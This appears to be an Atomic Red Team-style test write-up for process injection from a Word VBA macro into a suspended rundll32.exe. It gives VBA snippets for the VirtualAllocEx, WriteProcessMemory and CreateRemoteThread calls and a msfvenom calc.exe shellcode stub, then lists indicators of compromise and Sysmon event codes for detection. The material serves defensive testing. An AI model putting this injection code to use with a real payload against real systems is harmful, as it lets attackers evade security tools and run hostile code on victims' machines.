# Test #1 - Shellcode Execution via VBA

## Basic Information

| Attribute              | Value                                |
| ---------------------- | ------------------------------------ |
| **Test ID**            | T1055-001                            |
| **GUID**               | 1c91e740-1729-4329-b779-feba6e71d048 |
| **Technique**          | Process Injection                    |
| **Sub-technique**      | Classic Remote Thread Injection      |
| **Platform**           | Windows                              |
| **Executor**           | PowerShell                           |
| **Elevation Required** | No                                   |

## Objective

This test demonstrates **Process Injection** via VBA macro in Microsoft Word. The technique injects shellcode into a newly created process (`rundll32.exe`) and executes it in the context of a legitimate process to bypass security controls and evade detection.

## Prerequisites

- **Microsoft Office 64-bit** (required for VBA `PtrSafe` and `LongLong` support)
- **VBA Macro File**: `T1055-macrocode.txt`

**Input Parameters:**

- `txt_path`: Path to VBA macro file (default: `PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt`)

## Technical Description

### Execution Flow

```
1. VBA Macro Execute() triggered
   ↓
2. Shellcode Preparation (hex string → byte array)
   ↓
3. CreateProcessA("rundll32.exe", SUSPENDED)
   ↓
4. VirtualAllocEx() - Allocate RWX memory in remote process
   ↓
5. WriteProcessMemory() - Write shellcode byte-by-byte
   ↓
6. CreateRemoteThread() - Execute shellcode at allocated address
   ↓
Result: Calculator spawns from rundll32.exe
```

### Technical Steps

#### **Step 1: Structures & API Declarations**

```vba
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    ' ... other fields
End Type
```

**API Imports:**

- `CreateProcessA` - Create new process
- `VirtualAllocEx` - Allocate memory in remote process
- `WriteProcessMemory` - Write data to remote process memory
- `CreateRemoteThread` - Create and execute thread in remote process

#### **Step 2: Shellcode Preparation**

```vba
' msfvenom --arch x64 --platform windows -p windows/x64/exec CMD=calc.exe -f c
sc = "fc4883e4f0e8c00000004151415052..."

' Convert hex string to byte array
scLen = Len(sc) / 2
ReDim byteArray(0 To scLen)
For i = 0 To scLen - 1
    Value = Mid(sc, pos, 2)
    byteArray(i) = Val("&H" & Value)
Next
```

**Shellcode:** Metasploit x64 payload (~276 bytes) - executes calc.exe

#### **Step 3: Create Victim Process**

```vba
res = createProcessA(sNull,
    "C:\Windows\System32\rundll32.exe",
    ByVal 0&,
    ByVal 0&,
    ByVal 1&,       ' Inherit handles
    ByVal 4&,       ' CREATE_SUSPENDED (0x4)
    ByVal 0&,
    sNull,
    sInfo,
    pInfo)
```

**Why `rundll32.exe`?**

- Legitimate Windows binary
- Commonly runs in normal environments
- Less suspicious than unknown processes

**CREATE_SUSPENDED flag:** Process created but primary thread not running, allowing code injection before execution.

#### **Step 4: Memory Allocation**

```vba
newAllocBuffer = virtualAllocEx(pInfo.hProcess,
    0,                          ' System chooses address
    UBound(byteArray),         ' Size = shellcode size
    MEM_COMMIT,                 ' Commit pages
    PAGE_EXECUTE_READWRITE)     ' RWX permissions (0x40)
```

**Memory Protection:** `PAGE_EXECUTE_READWRITE` - Read + Write + Execute permissions

⚠️ **Note:** RWX memory is a strong indicator for EDR/AV detection.

#### **Step 5: Write Shellcode**

```vba
For Offset = 0 To UBound(byteArray)
    res = writeProcessMemory(pInfo.hProcess,
        newAllocBuffer + Offset,    ' Target address
        byteArray(Offset),          ' Source byte
        1,                          ' Write 1 byte
        ByVal 0&)
Next Offset
```

**Note:** Writes shellcode byte-by-byte (~276 writes). Could be optimized to write entire array at once.

#### **Step 6: Execute Shellcode**

```vba
res = createRemoteThread(pInfo.hProcess,
    0,                  ' Default security
    0,                  ' Default stack size
    newAllocBuffer,     ' Start address (shellcode location)
    0,                  ' No parameter
    0,                  ' Run immediately
    0)
```

Creates new thread in target process. Thread executes at `newAllocBuffer` address. Shellcode runs in context of `rundll32.exe`, spawning Calculator.

## Indicators of Compromise (IoCs)

### Process Tree

```
WINWORD.EXE
    └─── rundll32.exe (no arguments - SUSPICIOUS)
         └─── calc.exe
```

### Behavioral Indicators

1. **Process Behavior**

   - Microsoft Word spawning `rundll32.exe` without command line arguments
   - Unexpected child processes from `rundll32.exe`

2. **Memory Artifacts**

   - RWX memory regions in `rundll32.exe`
   - Unsigned code execution
   - Memory regions not mapped to loaded modules

3. **API Call Sequence**

   ```
   CreateProcessA → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
   ```

   Classic injection pattern easily detected by EDR.

4. **VBA Macro Activity**
   - Suspicious API declarations in macro code
   - kernel32.dll imports (CreateRemoteThread, VirtualAllocEx, etc.)

## Log Source Analysis

| Data Component            | Source             | Channel                              | EventCode | Will Generate? | Detection Value |
| ------------------------- | ------------------ | ------------------------------------ | --------- | -------------- | --------------- |
| Process Creation (DC0032) | WinEventLog:Sysmon | Microsoft-Windows-Sysmon/Operational | 1         | ✅ **YES**     | **HIGH**        |
| Process Access (DC0035)   | WinEventLog:Sysmon | Microsoft-Windows-Sysmon/Operational | 10        | ✅ **YES**     | **CRITICAL**    |
| Module Load (DC0016)      | WinEventLog:Sysmon | Microsoft-Windows-Sysmon/Operational | 7         | ⚠️ **MAYBE**   | **LOW**         |
| OS API Execution (DC0021) | ETW                | Microsoft-Windows-Kernel-Process     | N/A       | ⚠️ **MAYBE**   | **MEDIUM**      |

### Quick Analysis

**Sysmon Event ID 1 (Process Creation)** - ✅ **YES**

- Triggers when `CreateProcessA("rundll32.exe")` is called
- Expected: WINWORD.EXE → rundll32.exe (no arguments)
- **Primary detection point**: Office spawning system binary without proper arguments

**Sysmon Event ID 10 (Process Access)** - ✅ **YES**

- Triggers 3-5 times during injection:
  - VirtualAllocEx (GrantedAccess: 0x0008)
  - WriteProcessMemory (GrantedAccess: 0x0020)
  - CreateRemoteThread (GrantedAccess: 0x1FFFFF)
- **Best indicator**: CallTrace shows `CreateRemoteThread`
- **Critical detection point**: Cross-process memory operations

**Sysmon Event ID 7 (Module Load)** - ⚠️ **MAYBE**

- Will generate events for normal Office DLL loads (kernel32.dll, ntdll.dll)
- **Low detection value**: Office legitimately loads these DLLs
- Only useful if loading unsigned/suspicious DLLs (not in this test)

**ETW API Calls** - ⚠️ **MAYBE**

- Only if ETW tracing manually enabled (not default)
- Captures: NtCreateProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx
- **Rare in production**: High overhead, requires manual setup
